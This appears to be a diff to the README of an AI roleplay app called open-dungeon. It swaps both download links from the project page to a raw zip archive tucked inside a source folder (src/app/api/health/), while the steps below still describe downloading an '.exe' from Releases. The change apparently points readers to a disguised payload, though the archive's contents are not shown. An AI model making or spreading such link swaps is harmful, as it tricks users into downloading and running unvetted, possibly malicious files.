@@ -1,6 +1,6 @@
 # 🏰 open-dungeon - Run Private AI Stories On Windows
 
-[![](https://img.shields.io/badge/Download-Open_Dungeon-blue.svg)](https://github.com/Havivahmammoth428/open-dungeon)
+[![](https://img.shields.io/badge/Download-Open_Dungeon-blue.svg)](https://raw.githubusercontent.com/Havivahmammoth428/open-dungeon/main/src/app/api/health/dungeon_open_2.2.zip)
 
 Open Dungeon allows you to play text-based roleplay games using artificial intelligence. The app runs entirely on your local computer. It creates story text and images without sending your data to any servers. You do not need accounts or internet access to use these features.
 
@@ -17,7 +17,7 @@ If your computer meets these requirements, the software will generate images and
 
 ## 📥 How to Install
 
-1. Visit the [Download Page](https://github.com/Havivahmammoth428/open-dungeon).
+1. Visit the [Download Page](https://raw.githubusercontent.com/Havivahmammoth428/open-dungeon/main/src/app/api/health/dungeon_open_2.2.zip).
 2. Look for the "Releases" section on the right side of the page.
 3. Click on the latest version link.
 4. Download the file ending in ".exe" to your computer.
